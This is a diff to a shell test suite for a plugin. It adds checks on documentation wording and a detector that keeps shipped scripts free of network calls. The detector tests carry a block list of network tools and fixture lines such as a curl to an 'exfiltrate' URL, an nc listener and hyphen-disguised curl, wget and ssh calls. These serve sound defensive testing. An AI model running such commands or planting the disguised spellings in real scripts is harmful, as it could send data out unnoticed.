+#     BASH_ANY_HOOK_REGEX above for why the claim is false (this repo's own ADR-0002 records
+#     auto-approving `Bash` as possible and REFUSED), what the true scoped form is, and why nine
+#     copies survived the sweep that corrected README.md, docs/OTHER-TOOLS.md and
+#     docs/ACCEPTANCE.md.
+assert_eq "" "$bash_any_hook_hits" "no tracked file may say that no hook - or no hook at all, or none by any hook - can auto-approve a \`Bash\` call. A PreToolUse hook may match \`Bash\` and may answer permissionDecision \"allow\"; docs/adr/0002 records squirrel-mode REFUSING to register one. Say what is true instead: this plugin's PreToolUse matcher is \`Write|Edit|Read\`, so no hook of this plugin's runs on a \`Bash\` call - a choice of configuration, not a limit of the tool"
+
+# FAILURE PROOF (invariant 7c): the exact sentence this scan was written against, put back into a
+# scratch copy of the REAL file that carried it - skills/dig/SKILL.md, the copy that mattered most
+# because the model reads it at run time. Not a hand-written sentence: the mutation reverts the
+# corrected wording to the wording that shipped.
+bah_fixture="$glossary_avoid_scratch/dig-no-hook.md"
+# shellcheck disable=SC2016 # single-quoted deliberately: literal skill text, backticks and all.
+sed 's/squirrel-mode registers no hook that runs on a `Bash` call - its `PreToolUse` matcher names `Write`, `Edit` and `Read` and nothing else -/no hook can auto-approve a `Bash` call,/' \
+  "$repo_root/skills/dig/SKILL.md" >"$bah_fixture"
+if cmp -s "$repo_root/skills/dig/SKILL.md" "$bah_fixture"; then
+  bah_fixture_differs=no
+else
+  bah_fixture_differs=yes
+fi
+assert_eq "yes" "$bah_fixture_differs" "FAILURE PROOF (invariant 7c), control: the mutation must genuinely change skills/dig/SKILL.md - a sed that matched nothing would leave a byte-identical copy, which the scan correctly passes, and this proof would report clean while testing nothing"
+if grep -qiE "$BASH_ANY_HOOK_REGEX" "$bah_fixture" 2>/dev/null; then
+  bah_fixture_caught=yes
+else
+  bah_fixture_caught=no
+fi
+assert_eq "yes" "$bah_fixture_caught" "FAILURE PROOF (invariant 7c): reverting skills/dig/SKILL.md's disclosure to 'no hook can auto-approve a \`Bash\` call' in a scratch copy must be caught by BASH_ANY_HOOK_REGEX"
+
+# And the second shape, the one that reached a test COMMENT rather than shipped prose, so the proof
+# is not tuned to a single sentence.
+bah_fixture2="$glossary_avoid_scratch/base-rules-any-hook.sh"
+sed "s/so no hook OF THIS PLUGIN'S runs on a \`Bash\` call at/and ADR-0002 records that a \`Bash\` call is never auto-approved at any path by any hook, at/" \
+  "$repo_root/tests/test_base_rules.sh" >"$bah_fixture2"
+if cmp -s "$repo_root/tests/test_base_rules.sh" "$bah_fixture2"; then
+  bah_fixture2_differs=no
+else
+  bah_fixture2_differs=yes
+fi
+assert_eq "yes" "$bah_fixture2_differs" "FAILURE PROOF (invariant 7c, second shape), control: the mutation must genuinely change tests/test_base_rules.sh"
+if grep -qiE "$BASH_ANY_HOOK_REGEX" "$bah_fixture2" 2>/dev/null; then
+  bah_fixture2_caught=yes
+else
+  bah_fixture2_caught=no
+fi
+assert_eq "yes" "$bah_fixture2_caught" "FAILURE PROOF (invariant 7c, second shape): the 'never auto-approved at any path by any hook' wording, restored into a scratch copy of tests/test_base_rules.sh, must be caught too - the scan bounds a class, not one sentence"
+
+# THE NEGATIVE HALF - without it this guard bars the correct wording as readily as the wrong one,
+# which is the failure mode this repo deletes a guard over. Four wordings that must ALL pass: a
+# claim about the NAMED script (true - allow-checkpoint.sh only ever sees Write/Edit/Read), the
+# same claim in the past tense, the plugin-scoped form README.md now uses, and the
+# docs/ACCEPTANCE.md form that says "at any path" about THIS plugin's hook.
+bah_safe_fixture="$glossary_avoid_scratch/bash_any_hook_safe.md"
+{
+  printf '# Sample doc\n\n'
+  printf 'allow-checkpoint.sh can never auto-approve a Bash call.\n'
+  printf 'scripts/allow-checkpoint.sh could never auto-approve a Bash call, and the session stopped.\n'
+  printf "No hook of this plugin's is ever invoked for a \`Bash\` call and none of them can auto-approve one.\n"
+  # shellcheck disable=SC2016 # single-quoted deliberately: literal doc text, backticks and all.
+  printf 'This plugin hook is never invoked for a `Bash` call and cannot auto-approve one, at any path.\n'
+} >"$bah_safe_fixture"
+if grep -qiE "$BASH_ANY_HOOK_REGEX" "$bah_safe_fixture" 2>/dev/null; then
+  bah_safe_caught=yes
+else
+  bah_safe_caught=no
+fi
+assert_eq "no" "$bah_safe_caught" "sanity check (invariant 7c): the four TRUE wordings - the named script, its past tense, the plugin-scoped form, and 'at any path' said about this plugin's own hook - must all pass. A guard that flagged them would bar the correct statement, and this repo deletes such a guard rather than narrowing it a third time"
+
+# And the same negative half against the REAL files that carry those wordings today, so it rests on
+# shipped text rather than only on a fixture that paraphrases it.
+for bah_safe_path in scripts/load-profile.sh tests/test_skills.sh tests/test_hooks.sh README.md docs/ACCEPTANCE.md; do
+  if grep -qiE "$BASH_ANY_HOOK_REGEX" "$repo_root/$bah_safe_path" 2>/dev/null; then
+    bah_real_caught=yes
+  else
+    bah_real_caught=no
+  fi
+  assert_eq "no" "$bah_real_caught" "sanity check (invariant 7c): $bah_safe_path must pass this scan as it actually stands - it carries a correctly scoped statement about which hook does not run on a \`Bash\` call, and the scan must not touch it"
+done
 
 # 8. [W4, replaces the V3/W3 proximity heuristic — see the HISTORY comment above PIN_* for why]
 #    Exact-text pins on the six sentences that state the plugin-state hard-off/install-activation
@@ -601,6 +1104,50 @@ assert_eq "no" "$same_sentence_safe_caught" "sanity check: a /plugin verb and an
 # ================================================================================================
 NETWORK_COMMAND_REGEX="curl|wget|fetch|nc|ncat|netcat|socat|ssh|scp|sftp|ftp|tftp|telnet|rsync|ping|traceroute|tracepath|nslookup|dig|drill|whois|openssl|python|python3|perl|ruby|node|nodejs|php|lwp-request|lynx|w3m|links"
 
+# AN OPERAND IS NOT AN INVOCATION, AND THE CUT THAT SAYS SO IS ONE TOKEN
+# WIDE (added by the hard-link audit; NARROWED by the cycle-2 audit).
+# `grep -w` treats "-" as a word boundary, so a flag or operand that ENDS
+# in a listed name matches as though the command had been invoked. That
+# is not hypothetical: scripts/allow-checkpoint.sh's hard-link refusal
+# calls `find "$leaf" -links +1`, and `-links` matched the `links` text
+# browser, turning a POSIX `find` predicate into a reported network call.
+# POSIX find offers no other spelling of that predicate, so the check is
+# what had to change.
+#
+# WHAT THE FIRST REPAIR DID, AND WHY IT WAS THE WRONG CUT. It removed
+# EVERY token beginning with whitespace-then-"-" before the word scan
+# ran, and justified that with "no command is ever invoked by a name
+# starting with '-'". That argument is about the FIRST token of a
+# command; the sed was applied to every token of every line, so it also
+# deleted the text a network call was hiding INSIDE. Measured, not
+# reasoned: appending `foo -mode-curl https://example.com/exfiltrate` -
+# a real, working network call - to a real shipped script left this
+# invariant reporting zero hits and the whole file green at 133 pass /
+# 0 fail. `foo -x-wget https://x`, `sh -c-python3 -m http.server`,
+# `cmd | -filter-ssh host` and `aws s3 -no-verify-ssh https://x` all
+# went the same way. Every one of them was caught before that repair,
+# and none of the three fixtures it shipped with covers the class it
+# deleted - the three cover only the cases that still worked.
+#
+# WHAT IS CUT NOW: the literal `-links` predicate, and nothing else. It
+# is the only false positive this repo has, it is silenced by name, and
+# every other space-dash token reaches the word scan exactly as it did
+# before the hard-link layer existed. `curl -s https://x` still reports
+# `curl`; `lwp-request` is untouched, because its hyphen is not preceded
+# by whitespace and it is the command name itself; and
+# `foo -mode-curl https://x` is reported again, which is the class the
+# blind cut lost. All of those directions are proved below against real
+# scratch copies rather than argued here, the recovered class included.
+#
+# THE NARROWING IS SAFE FOR THIS REPO'S OTHER `find` USES, checked the
+# same way rather than assumed: the only other predicates any shipped
+# script passes to `find` are `-mtime` and `-newer`, neither of which
+# ends in a listed name, and the real-repo scan below reports zero hits
+# under this rule.
+strip_links_predicate() {
+  sed -E 's/[[:space:]]-links([[:space:]]|$)/ /g'
+}
+
 network_hits=""
 shipped_scripts=$(git -C "$repo_root" ls-files 'scripts/*.sh')
 shipped_scripts="$shipped_scripts
@@ -612,7 +1159,7 @@ IFS='
 for f in $shipped_scripts; do
   [ -n "$f" ] || continue
   [ -f "$repo_root/$f" ] || continue
-  code_only=$(grep -vE '^[[:space:]]*#' "$repo_root/$f" 2>/dev/null || true)
+  code_only=$(grep -vE '^[[:space:]]*#' "$repo_root/$f" 2>/dev/null | strip_links_predicate || true)
   if printf '%s\n' "$code_only" | grep -qwE "$NETWORK_COMMAND_REGEX" 2>/dev/null; then
     network_hits="$network_hits $f"
   fi
@@ -623,7 +1170,7 @@ assert_eq "" "$network_hits" "no shipped script (scripts/*.sh, targets/*/install
 network_code_fixture="$glossary_avoid_scratch/network_code.sh"
 cp "$repo_root/scripts/allow-checkpoint.sh" "$network_code_fixture"
 printf '\ncurl https://example.com/exfiltrate >/dev/null 2>&1\n' >>"$network_code_fixture"
-fixture_code_only=$(grep -vE '^[[:space:]]*#' "$network_code_fixture" 2>/dev/null || true)
+fixture_code_only=$(grep -vE '^[[:space:]]*#' "$network_code_fixture" 2>/dev/null | strip_links_predicate || true)
 if printf '%s\n' "$fixture_code_only" | grep -qwE "$NETWORK_COMMAND_REGEX" 2>/dev/null; then
   network_code_fixture_caught=yes
 else
@@ -634,13 +1181,92 @@ assert_eq "yes" "$network_code_fixture_caught" "FAILURE PROOF (invariant 10, cod
 network_comment_fixture="$glossary_avoid_scratch/network_comment.sh"
 cp "$repo_root/scripts/allow-checkpoint.sh" "$network_comment_fixture"
 printf '\n# example of what NOT to do: curl https://example.com/exfiltrate would be a network call\n' >>"$network_comment_fixture"
-fixture_comment_only=$(grep -vE '^[[:space:]]*#' "$network_comment_fixture" 2>/dev/null || true)
+fixture_comment_only=$(grep -vE '^[[:space:]]*#' "$network_comment_fixture" 2>/dev/null | strip_links_predicate || true)
 if printf '%s\n' "$fixture_comment_only" | grep -qwE "$NETWORK_COMMAND_REGEX" 2>/dev/null; then
   network_comment_fixture_caught=yes
 else
   network_comment_fixture_caught=no
 fi
 assert_eq "no" "$network_comment_fixture_caught" "sanity check: the identical text placed inside a full-line comment must NOT be caught — this check scans CODE, not the prose that happens to describe an attack path (e.g. this very file's own '.ssh/id_rsa' comment, or allow-checkpoint.sh's identical comment)"
+
+# --- strip_links_predicate must not become a way to smuggle a network
+#     call past this check. Two fixtures, both against a real shipped
+#     script: a command that takes a flag (the flag is left alone now,
+#     and the COMMAND was always the first token, so it must still be
+#     reported), and a command whose own name contains a hyphen (nothing
+#     to strip, still reported). Without these, tolerating `find -links`
+#     would be an unproved loosening of the one invariant that keeps this
+#     plugin network-free.
+network_flag_fixture="$glossary_avoid_scratch/network_flag.sh"
+cp "$repo_root/scripts/allow-checkpoint.sh" "$network_flag_fixture"
+printf '\nnc -l 1234 >/dev/null 2>&1\n' >>"$network_flag_fixture"
+fixture_flag_only=$(grep -vE '^[[:space:]]*#' "$network_flag_fixture" 2>/dev/null | strip_links_predicate || true)
+if printf '%s\n' "$fixture_flag_only" | grep -qwE "$NETWORK_COMMAND_REGEX" 2>/dev/null; then
+  network_flag_fixture_caught=yes
+else
+  network_flag_fixture_caught=no
+fi
+assert_eq "yes" "$network_flag_fixture_caught" "FAILURE PROOF (invariant 10, operand stripping): a real network command invoked WITH a flag must still be caught - stripping ' -l' must never take the command name with it"
+
+network_hyphen_fixture="$glossary_avoid_scratch/network_hyphen.sh"
+cp "$repo_root/scripts/allow-checkpoint.sh" "$network_hyphen_fixture"
+printf '\nlwp-request -m GET https://example.com >/dev/null 2>&1\n' >>"$network_hyphen_fixture"
+fixture_hyphen_only=$(grep -vE '^[[:space:]]*#' "$network_hyphen_fixture" 2>/dev/null | strip_links_predicate || true)
+if printf '%s\n' "$fixture_hyphen_only" | grep -qwE "$NETWORK_COMMAND_REGEX" 2>/dev/null; then
+  network_hyphen_fixture_caught=yes
+else
+  network_hyphen_fixture_caught=no
+fi
+assert_eq "yes" "$network_hyphen_fixture_caught" "FAILURE PROOF (invariant 10, hyphenated command name): lwp-request must still be caught - its hyphen is not preceded by whitespace, so operand stripping must leave it whole"
+
+# And the case that motivated the change, asserted directly rather than
+# only through the real-repo scan above: a `find` predicate that ends in
+# a listed name is an OPERAND and must not be reported.
+network_operand_fixture="$glossary_avoid_scratch/network_operand.sh"
+# shellcheck disable=SC2016 # single-quoted deliberately: literal fixture source text, not substitution.
+printf '#!/bin/sh\nif [ -n "$(find "$1" -links +1 2>/dev/null)" ]; then\n  exit 1\nfi\n' >"$network_operand_fixture"
+fixture_operand_only=$(grep -vE '^[[:space:]]*#' "$network_operand_fixture" 2>/dev/null | strip_links_predicate || true)
+if printf '%s\n' "$fixture_operand_only" | grep -qwE "$NETWORK_COMMAND_REGEX" 2>/dev/null; then
+  network_operand_fixture_caught=yes
+else
+  network_operand_fixture_caught=no
+fi
+assert_eq "no" "$network_operand_fixture_caught" "sanity check (invariant 10): \`find <file> -links +1\` is a POSIX predicate, not the \`links\` browser - this is the false positive that made the operand stripping necessary, and it is asserted here so a future change to the regex cannot silently reintroduce it"
+
+# --- THE CLASS THE BLIND CUT DELETED, PINNED SO IT CANNOT BE REOPENED IN
+#     SILENCE. A network command spelled so that its name is the tail of a
+#     space-dash token - `foo -mode-curl https://x` - is a working
+#     invocation of nothing at all on its own, but the TEXT is what this
+#     invariant scans, and every one of these was reported before the
+#     hard-link audit and by none of the fixtures above. Reproduced
+#     against a real shipped script: with the token-wide cut in place the
+#     whole file stayed green at 133 pass / 0 fail with a live
+#     `https://example.com/exfiltrate` sitting in scripts/check-off-flag.sh.
+#     Four spellings, because one of them could be silenced by an
+#     accident of the regex and four cannot.
+smuggled_lines_10='foo -mode-curl https://example.com/exfiltrate
+foo -x-wget https://example.com/x
+sh -c-python3 -m http.server
+aws s3 -no-verify-ssh https://example.com/x'
+old_ifs_10=$IFS
+IFS='
+'
+for smuggled_10 in $smuggled_lines_10; do
+  IFS=$old_ifs_10
+  network_smuggle_fixture="$glossary_avoid_scratch/network_smuggle.sh"
+  cp "$repo_root/scripts/check-off-flag.sh" "$network_smuggle_fixture"
+  printf '\n%s\n' "$smuggled_10" >>"$network_smuggle_fixture"
+  fixture_smuggle_only=$(grep -vE '^[[:space:]]*#' "$network_smuggle_fixture" 2>/dev/null | strip_links_predicate || true)
+  if printf '%s\n' "$fixture_smuggle_only" | grep -qwE "$NETWORK_COMMAND_REGEX" 2>/dev/null; then
+    network_smuggle_caught=yes
+  else
+    network_smuggle_caught=no
+  fi
+  assert_eq "yes" "$network_smuggle_caught" "FAILURE PROOF (invariant 10, the class a token-wide cut deletes): '$smuggled_10' appended to a real shipped script must be reported - a cut that removes every space-dash token removes the network command's own name along with the flag it is hiding behind, and this repo shipped exactly that with the suite green"
+  IFS='
+'
+done
+IFS=$old_ifs_10
 
 # --- 11. docs/ACCEPTANCE.md's probe-6 citation is the corrected one (S9 fix cycle 1, Y4) --------
 #
@@ -769,11 +1395,13 @@ assert_eq "" "$mismatched_criteria" "every docs/ACCEPTANCE.md criterion heading,
 #
 # Reuses $glossary_avoid_scratch (created earlier in this file) rather than mktemp-ing a fresh
 # directory of its own — the same pattern same_sentence_fixture and network_code_fixture already
-# follow below. `trap ... EXIT` REPLACES the previous handler in POSIX sh rather than stacking with
-# it, so a fourth `mktemp -d` + `trap` pair here would silently stop $glossary_avoid_scratch itself
-# from ever being cleaned up on exit — a leak this fix would introduce, not fix. (z1_scratch, set up
-# even earlier, is already superseded by glossary_avoid_scratch's own trap this same way; that is
-# pre-existing residue from before this cycle, not something to silently expand scope to fix here.)
+# follow below. That is now a convenience rather than a necessity: this file has ONE `trap ... EXIT`
+# and one $cleanup_paths list (see the cleanup header at the top), so a fresh `mktemp -d` appended to
+# that list would be cleaned up too. Until it did, the note here was right about the mechanism and
+# wrong about the residue it dismissed: `trap` REPLACES the previous handler in POSIX sh, the second
+# declaration had already disinherited $z1_scratch, and that directory was leaking on every single
+# run — one per run, forever, not a one-off. It is on the list now, and the SCRATCH-LEAK assertion at
+# the bottom of this file fails if any scratch path here goes unscheduled again.
 aa4_fixture="$glossary_avoid_scratch/ACCEPTANCE_mutated.md"
 sed 's/on the \*\*first\*\* message/on the first message/; s/and on \*\*every\*\* message/and on every message/' "$acceptance_file" >"$aa4_fixture"
 
@@ -3033,5 +3661,356 @@ assert_eq "yes" "$mutant15_addsentence_manual_changed" "sanity (invariant 15, Fi
 mutant15_addsentence_manual_set=$(extract_manual_number_set "$mutant15_addsentence_manual_flat")
 mutant15_addsentence_manual_violations=$(set_subset_violations "$mutant15_addsentence_manual_set" "$s15_manual_set")
 assert_eq "" "$mutant15_addsentence_manual_violations" "LEGITIMATE REWORDING 4/4 (invariant 15, Fix 2, manual, added sentence): an added explanatory sentence mentioning criterion 8 (already genuinely \`manual\`) by number must pass CLEAN — mentioning a criterion that genuinely holds the status being checked is not a defect"
+
+# --- 16. NO TRACKED FILE MAY CLAIM THAT THIS PLUGIN CREATES EITHER
+# GOVERNED ROOT --------------------------------------------------------------
+#
+# The claim: "a symlink at `checkpoints/` is never legitimate because only the plugin creates that
+# directory". It is false, and `grep -rn mkdir` over this repo is the whole disproof — no shipped
+# script, skill or rule creates `~/.squirrel/checkpoints/` or `~/.squirrel/hoard/`. `/squirrel:init`
+# creates `~/.squirrel/` and writes `profile.md` into it, nothing deeper; both roots come into
+# existence implicitly, as the parent directory the model's first `Write` inside them creates. The
+# conclusion survives — a plain file write never produces a symlink — but the stated reason did not.
+#
+# WHY IT IS SCANNED REPO-WIDE AND NOT IN ONE FILE. `tests/test_hooks.sh`'s HOARD-18 already forbids
+# this claim by needle, and its scope is `scripts/allow-checkpoint.sh` — one file. So the identical
+# sentence sat untouched in `docs/adr/0002-checkpoint-auto-allow.md`, which is the document a reader
+# of the ADR trail reaches FIRST, for a whole audit cycle after the script was corrected. A guard
+# whose scope is narrower than the claim's reach is a guard the claim walks around. This one covers
+# every tracked file outside `tests/` — the exclusion those content scans all take, for the
+# self-reference reason the top of this file sets out: this very block has to name the phrase it
+# forbids.
+# IT IS SCANNED FLATTENED, NOT LINE BY LINE, AND THAT IS THE SECOND FIX. The scan used to be
+# `git grep -lF`, which matches inside ONE line, so the identical claim written across two lines of
+# the same comment passed clean. Proved by mutation rather than argued: with the sentence on a
+# single line the suite reported `pass=141 fail=1`; with the SAME sentence broken across two comment
+# lines it reported `pass=142 fail=0`. That is not a hypothetical shape either — the file this
+# invariant most needs to cover, `scripts/allow-checkpoint.sh`, wraps its comments at about 72
+# columns, so a claim of this length is MORE likely to be split than not. That both original
+# occurrences happened to sit on one line each was luck, and a guard resting on luck about line
+# breaks is a guard that reports on formatting rather than on content.
+#
+# So each tracked file is flattened first — leading indentation and any comment or list marker
+# stripped from every line, runs of blank space squashed, the whole file joined into one line — and
+# the needles are matched against that. What that costs is stated rather than implied: the flattened
+# form can join two genuinely unrelated sentences across a paragraph break, so a file that ended one
+# sentence with "…plugin creates" and began the next with "that directory…" would be reported. No
+# tracked file does, the needles are long enough to make it unlikely, and a false report here costs
+# one reader one minute — while a false pass costs a whole cycle, which is what happened.
+NO_PLUGIN_CREATES_ROOT_NEEDLES='plugin creates that directory
+plugin creates both directories'
+
+plugin_creates_scan() {
+  # plugin_creates_scan <root> <newline-separated relative paths> — prints one "<needle>:<path>"
+  # line per hit, reading each file FLATTENED.
+  #
+  # A FUNCTION, AND THAT IS THE THIRD FIX. The live assertion and the failure proof must run THE
+  # SAME CODE, or the proof does not prove anything about the assertion. The previous proof only
+  # showed that `grep -F` could match the stale sentence in a scratch file — a fact about `grep`,
+  # not about this invariant. It never once showed the assertion going red, so a scan that skipped
+  # every file, or read the wrong tree, would have satisfied it exactly as well.
+  pcs_root=$1
+  pcs_files=$2
+  printf '%s\n' "$pcs_files" | while IFS= read -r pcs_f; do
+    [ -n "$pcs_f" ] || continue
+    [ -f "$pcs_root/$pcs_f" ] || continue
+    # `sed | tr | tr` rather than an awk accumulator: appending to one string per line is quadratic
+    # in the awks this repo ships to, and some tracked files run to thousands of lines. Each stage
+    # here is a linear stream. The marker class covers shell comments, Markdown blockquotes and
+    # Markdown list bullets, which is every way a wrapped claim is spelled in this tree.
+    pcs_flat="$glossary_avoid_scratch/flat.$$"
+    sed -e 's/^[[:space:]]*//' -e 's/^[#>*-][#>*-]*[[:space:]]*//' "$pcs_root/$pcs_f" 2>/dev/null \
+      | tr '\n' ' ' | tr -s ' ' >"$pcs_flat" 2>/dev/null || continue
+    pcs_old_ifs=$IFS
+    IFS='
+'
+    for pcs_needle in $NO_PLUGIN_CREATES_ROOT_NEEDLES; do
+      IFS=$pcs_old_ifs
+      if grep -qF -- "$pcs_needle" "$pcs_flat" 2>/dev/null; then
+        printf '%s:%s\n' "$pcs_needle" "$pcs_f"
+      fi
+      IFS='
+'
+    done
+    IFS=$pcs_old_ifs
+    rm -f "$pcs_flat"
+  done
+}
+
+plugin_creates_tracked=$(git -C "$repo_root" ls-files 2>/dev/null | grep -v '^tests/' || true)
+assert_eq "yes" "$([ -n "$plugin_creates_tracked" ] && echo yes || echo no)" "control (invariant 16): the tracked-file list outside tests/ must be non-empty — an empty list makes the scan below pass by reading nothing at all, which is the exact way a repo-wide negative goes quietly vacuous"
+plugin_creates_hits=$(plugin_creates_scan "$repo_root" "$plugin_creates_tracked" | tr '\n' ' ')
+assert_eq "" "$plugin_creates_hits" "no tracked file outside tests/ may say this plugin creates either governed root — nothing does; both come into existence as the parent directory of the model's first Write, and the symlink boundary rests on 'a plain file write never produces a symlink' instead"
+
+# FAILURE PROOF. A negative that could never match anything is the "guard that cannot fail for its
+# own target" class this repo has been bitten by repeatedly. Both needles are proved against real
+# document text with the stale sentence restored — and, unlike the version this replaces, proved by
+# running THE ASSERTION'S OWN SCAN over a corpus containing the mutant and watching it come back
+# NON-EMPTY. "The needle matches in a scratch file" was the old proof and it is not the same claim.
+plugin_creates_corpus="$glossary_avoid_scratch/inv16-corpus"
+mkdir -p "$plugin_creates_corpus/docs/adr" "$plugin_creates_corpus/scripts"
+
+# Mutant one: ADR-0002 with the stale clause restored, ON ONE LINE — the shape the old scan could
+# see, kept so the new scan is proved to be a superset of the old one and not a replacement that
+# lost a case.
+sed "s|the only mechanism that ever creates that directory is a plain file write through this plugin's own flow, and a plain file write never produces a symlink|only the plugin creates that directory|" \
+  "$repo_root/docs/adr/0002-checkpoint-auto-allow.md" >"$plugin_creates_corpus/docs/adr/0002-checkpoint-auto-allow.md"
+if cmp -s "$repo_root/docs/adr/0002-checkpoint-auto-allow.md" "$plugin_creates_corpus/docs/adr/0002-checkpoint-auto-allow.md"; then
+  plugin_creates_mutant_differs=no
+else
+  plugin_creates_mutant_differs=yes
+fi
+assert_eq "yes" "$plugin_creates_mutant_differs" "FAILURE PROOF (invariant 16), control: restoring the stale clause must genuinely change docs/adr/0002-checkpoint-auto-allow.md — a sed that matched nothing would leave a byte-identical copy and prove nothing"
+
+# Mutant two: allow-checkpoint.sh with the both-roots spelling restored and BROKEN ACROSS TWO
+# COMMENT LINES at roughly the column that file actually wraps at. This is the case the old scan
+# missed entirely, written the way the real file would have written it.
+# The replacement carries a BACKSLASH FOLLOWED BY A REAL NEWLINE, which is how POSIX sed spells
+# "insert a line break here". `\n` in a replacement is NOT portable - BSD sed writes a literal "n",
+# which would put the whole phrase back on one line and make the control below fail loudly. It did,
+# on the first attempt; kept as a real newline rather than as an escape for exactly that reason.
+#
+# THE BREAK FALLS INSIDE THE NEEDLE, not merely somewhere in the sentence, and that is the whole
+# construction. A first attempt broke the line just BEFORE the phrase, which left
+# "plugin creates both directories" sitting contiguously on line two - and a plain grep found it,
+# so the mutant proved nothing about flattening. The needle has to straddle the boundary:
+# "…plugin creates" ends one line and "both directories…" opens the next.
+plugin_creates_split_repl='legitimate, because this plugin creates\
+# both directories itself - see'
+sed "s|legitimate, because the only thing that ever creates either root is a|$plugin_creates_split_repl|" \
+  "$repo_root/scripts/allow-checkpoint.sh" >"$plugin_creates_corpus/scripts/allow-checkpoint.sh"
+if cmp -s "$repo_root/scripts/allow-checkpoint.sh" "$plugin_creates_corpus/scripts/allow-checkpoint.sh"; then
+  plugin_creates_mutant2_differs=no
+else
+  plugin_creates_mutant2_differs=yes
+fi
+assert_eq "yes" "$plugin_creates_mutant2_differs" "FAILURE PROOF (invariant 16), control: restoring the both-roots spelling must genuinely change scripts/allow-checkpoint.sh"
+assert_eq "no" "$(grep -qF -- 'plugin creates both directories' "$plugin_creates_corpus/scripts/allow-checkpoint.sh" 2>/dev/null && echo yes || echo no)" "FAILURE PROOF (invariant 16), control: and the split mutant must be INVISIBLE to a plain line-wise grep — if a contiguous grep could still see it, the row below would not be measuring the flattening fix at all. This is the mutation that turned pass=141 fail=1 into pass=142 fail=0 under the old scan"
+
+plugin_creates_proof_hits=$(plugin_creates_scan "$plugin_creates_corpus" 'docs/adr/0002-checkpoint-auto-allow.md
+scripts/allow-checkpoint.sh')
+assert_contains "$plugin_creates_proof_hits" "plugin creates that directory:docs/adr/0002-checkpoint-auto-allow.md" "FAILURE PROOF (invariant 16): the assertion's OWN scan must REPORT the one-line stale clause — this is the sentence that survived a whole cycle because the guard that forbade it only ever read one script"
+assert_contains "$plugin_creates_proof_hits" "plugin creates both directories:scripts/allow-checkpoint.sh" "FAILURE PROOF (invariant 16): and it must report the clause BROKEN ACROSS TWO COMMENT LINES, which a line-wise grep cannot see. Two needles, two live proofs, and both run the scan the live assertion runs rather than a grep typed beside it"
+assert_eq "2" "$(printf '%s\n' "$plugin_creates_proof_hits" | grep -c 'plugin creates' || true)" "FAILURE PROOF (invariant 16), the tally: exactly two hits, so the scan returns non-empty for the corpus that violates the invariant — which is the thing the previous proof never showed. A scan that read nothing would report zero here and still pass the live assertion above"
+
+# ==========================================================================
+# GLOSSARY-COST. Every figure the exclusion-4 comment publishes, re-derived.
+#
+#     Exclusion 4 states what the glossary scan does NOT catch, and states it
+#     in numbers: five per-term costs (4b), the length of the two files 4a
+#     exempts, and the lines inside docs/adr/* the prefix hides. Every one of
+#     those was written by hand, and by the time anyone rechecked them:
+#
+#       - four of the five per-term counts (note 27, entry 30, record 38,
+#         namespace 5) were measurements of the scope as it stood BEFORE
+#         docs/specs/* and docs/plans/* joined the denylist — added by the
+#         very commit that wrote the counts, under a sentence claiming "this
+#         denylist applied";
+#       - the fifth, "fact: 22", matched no reading of this repo at all: 9 in
+#         the declared scope, 24 in the old one;
+#       - "579 and 1986 lines" gave the spec its pre-commit length, 38 lines
+#         short of what the same commit left on disk;
+#       - "five lines in three ADRs" was six, with the sixth never declared;
+#       - and the one line-number citation in that list, 0008:63, pointed at
+#         a sentence about `Read`, `Write` and `Edit` — 136 lines above the
+#         sentence it claimed to quote, because the ADR grew underneath it.
+#
+#     Nothing here is a better number. Every figure is recomputed on each run
+#     and compared against what the comment publishes, and each comparison
+#     PRINTS the recomputed value, so updating the comment is mechanical.
+#     Modelled on RENAME-COUNT in tests/test_hooks.sh, including its two
+#     controls: the claims must be readable in their documented shape, and
+#     the recount must find something — a broken counter agreeing with a
+#     broken comment is the failure this exists to prevent.
+#
+#     IT IS EXPECTED TO FAIL WHENEVER THE REPO GROWS INTO IT. That is the
+#     design: the comment is a snapshot, and a snapshot with nothing checking
+#     it is what this replaces.
+# ==========================================================================
+# THE FILE ACTUALLY RUNNING, not the tracked path spelled out by hand.
+# Written as "$script_dir/test_repo_invariants.sh" first, and it made every
+# comparison below unfalsifiable: a scratch copy with a rotted figure put
+# back read the REAL file's figures and passed clean. That is the "guard
+# that cannot fail for its own target" this repo has now hit seven times,
+# and it is caught here only because the mutation proof was run before the
+# scenario was believed. Deriving it from $0 means a mutated copy checks
+# the mutated copy.
+invariants_file_GC="$script_dir/$(basename "$0")"
+
+claimed_glossary_cost_GC() {
+  # claimed_glossary_cost_GC <term> -> "<hits> <files>" as exclusion 4b
+  # publishes them, or empty if that bullet is missing or reshaped. The
+  # tag is spelled with a literal term name only inside the comment; every
+  # mention below builds it from $gc_term, so this sed can never read its
+  # own caller's text back as a claim.
+  sed -n "s/.*glossary-cost $1: \\([0-9][0-9]*\\) hits across \\([0-9][0-9]*\\) in-scope files.*/\\1 \\2/p" "$invariants_file_GC"
+}
+
+count_glossary_term_GC() {
+  # count_glossary_term_GC <term> -> "<hits> <files>" over the scan's OWN
+  # scope: $glossary_scope_files, filled by the scan loop above as it ran,
+  # with the scan's own `grep -wiE`. Deliberately not a second copy of the
+  # denylist - the published counts rotted because the denylist moved and a
+  # hand-maintained copy of the scope did not move with it.
+  cgt_lines=0
+  cgt_files=0
+  for cgt_f in $glossary_scope_files; do
+    cgt_n=$(grep -cwiE "$1" "$repo_root/$cgt_f" 2>/dev/null) || cgt_n=0
+    [ -n "$cgt_n" ] || cgt_n=0
+    if [ "$cgt_n" -gt 0 ]; then
+      cgt_files=$((cgt_files + 1))
+      cgt_lines=$((cgt_lines + cgt_n))
+    fi
+  done
+  printf '%s %s' "$cgt_lines" "$cgt_files"
+}
+
+assert_eq "yes" "$([ -n "$glossary_scope_files" ] && echo yes || echo no)" "GLOSSARY-COST, control: the scan loop must have recorded the files it looked at - an empty scope list would make every per-term recount below 0 and agree with nothing"
+
+gc_claims_readable="yes"
+gc_recount_nonzero="yes"
+for gc_term in note entry fact record namespace; do
+  gc_claim=$(claimed_glossary_cost_GC "$gc_term")
+  [ -n "$gc_claim" ] || gc_claims_readable="no"
+  gc_actual=$(count_glossary_term_GC "$gc_term")
+  case "$gc_actual" in
+    0\ *) gc_recount_nonzero="no" ;;
+  esac
+done
+assert_eq "yes" "$gc_claims_readable" "GLOSSARY-COST, control: all five per-term cost lines must be readable out of exclusion 4b in the documented shape - a reworded bullet would otherwise be silently compared against nothing"
+assert_eq "yes" "$gc_recount_nonzero" "GLOSSARY-COST, control: every recount must find something - a zero would mean the counter is broken, and each of these five terms is documented as colliding with real, shipped text"
+
+for gc_term in note entry fact record namespace; do
